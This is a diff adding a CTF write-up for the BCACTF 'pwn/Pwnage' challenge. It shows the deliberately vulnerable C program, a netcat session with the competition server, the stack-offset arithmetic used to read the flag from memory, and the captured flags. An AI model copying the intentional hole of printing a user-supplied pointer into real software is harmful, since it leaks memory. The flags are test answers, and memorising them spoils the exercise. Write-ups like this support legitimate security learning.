@@ -244,3 +244,109 @@ r.interactive()
 ## Flag
 `bcactf{s1mple_CANaRY_9b36bd9f3fd2f}`
 
+
+# pwn/Pwnage
+## Challenge Description
+It's either a bug, a hack, an exploit, or it's pwnage.
+
+Let this challenge stand as one of the first of many stairs to mastery over that which can only be described as pwn.
+
+## Hint
+Connect using `nc` aka Netcat
+
+## Resoruces
+[provided.c](../assets/scripts/bpwnage/provided.c)
+
+```c
+
+int main() {
+    // Hint: how do these values get stored?
+    void* first_var;
+    char* guess;
+    char flag[100];
+    load_flag(flag, 100);
+
+    puts("Welcome to the most tasmastic game of all time!");
+    wait_for(3);
+    puts("Basically it's just too simple, I've put the");
+    puts("flag into the memory and your job is ... to");
+    puts("guess where it is!!");
+    wait_for(2);
+    puts("Have fun!");
+    wait_for(1);
+    puts("Oh and before you start, I'll give you a little");
+    puts("hint, the address of the current stackframe I'm");
+    printf("in is %p\n", (&first_var)[-2]);
+    wait_for(3);
+    puts("Okay anyway, back to the game. Make your guess!");
+    puts("(hexadecimals only, so something like 0xA would work)");
+    printf("guess> ");
+
+    guess = read_pointer();
+
+    wait_for(3);
+
+    puts("Okay, prepare yourself. If you're right this");
+    puts("will print out the flag");
+    
+    wait_for(1);
+    puts("Oh, and if your wrong, this might crash and");
+    puts("disconnect you\nGood luck!");
+
+    printf("%s\n", guess);
+
+    return 1;
+}
+```
+
+## Solution
+```console
+nc challs.bcactf.com 30810
+Welcome to the most tasmastic game of all time!
+ . . .
+Basically it's just too simple, I've put the
+flag into the memory and your job is ... to
+guess where it is!!
+ . .
+How fun is that!
+ .
+Oh and before you start, I'll give you a little
+hint, the address of the current stackframe I'm
+in is 0x7ffda62d1c60
+ . . .
+Okay anyway, back to the game. Make your guess!
+(hexadecimals only, so something like 0xA would work)
+guess> 
+```
+
+We are intially given th addess (`0x7ffda62d1c60`) for `first_var-2`. 
+
+```c
+    void* first_var;
+    char* guess;
+    char flag[100];
+    load_flag(flag, 100);
+    ...
+    printf("in is %p\n", (&first_var)[-2]); 
+```
+
+We need to guess the `memory address of flag`.
+
+If `address of (first_var - 2) is x`, then `address of first_var would be x+16 bytes`. Now there are `2 pointers between first_var and flag` (pointer to first_var and guess), and `each pointer also take 8 bytes`, thus the `total address difference bewteen (first_var - 2) and flag would be 32` (16+8+8), or `20 in hex`.
+
+so are guess would be `0x7ffda62d1c60 + 0x20 = 0x7ffda62d1c80`
+
+```console
+guess> 0x7ffda62d1c80
+ . . .
+Okay, prepare yourself. If you're right this
+will print out the flag
+ .
+Oh, and if your wrong, this might crash and
+disconnect you
+Good luck!
+bcactf{0nE_two_thR3E_f0ur_567___sT3ps_t0_PwN4G3_70cc0e5edd6ea}
+```
+
+## Flag
+`bcactf{0nE_two_thR3E_f0ur_567___sT3ps_t0_PwN4G3_70cc0e5edd6ea}`
